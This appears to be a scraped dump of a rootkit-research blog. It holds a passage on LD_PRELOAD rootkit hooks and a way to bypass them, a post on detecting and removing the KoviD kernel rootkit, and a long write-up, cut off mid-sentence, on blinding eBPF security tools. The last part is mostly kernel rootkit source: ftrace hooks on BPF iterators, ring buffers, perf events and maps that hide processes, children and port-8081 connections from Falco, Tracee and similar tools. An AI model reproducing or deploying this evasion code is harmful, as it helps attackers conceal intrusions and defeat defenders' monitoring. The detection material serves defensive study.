ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network 